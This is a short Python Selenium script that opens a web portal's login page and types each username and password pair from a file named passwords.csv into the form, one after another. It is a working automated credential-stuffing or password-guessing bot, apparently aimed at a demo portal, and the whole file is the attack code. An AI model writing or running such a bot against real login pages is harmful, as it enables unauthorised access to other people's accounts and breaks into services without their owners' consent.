import time
from pickle import FALSE
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from csv import reader


filename="passwords.csv"


options = Options()
options.headless = False
options.add_argument("--width=1500")
options.add_argument("--height=1300")
browser = webdriver.Firefox(options=options)

print ("*** START ***")
print ("Connecting to website ...")
browser.get("https://digico-web-portal.glitch.me/index.html")
time.sleep(3)
print ("Starting the login process ...")
browser.find_element(By.ID, "login-button").click()
time.sleep(3)

print ("Reading the credentials file ...")
with open(filename, 'r') as read_obj:
    csv_reader = reader(read_obj)
    # Iterate over each row in the csv using reader object
    for row in csv_reader:
        print ("Testing credentials " + row[0] + "," + row[1])
        try:
            browser.find_element(By.NAME, "username").send_keys(row[0])
            browser.find_element(By.ID, "password").send_keys(row[1])
            browser.find_element(By.CSS_SELECTOR, "#login-submit > div").click()
            time.sleep(3)
        except Exception as ex:
            print ("Something went wrong. Stopping the bot")
            quit ()






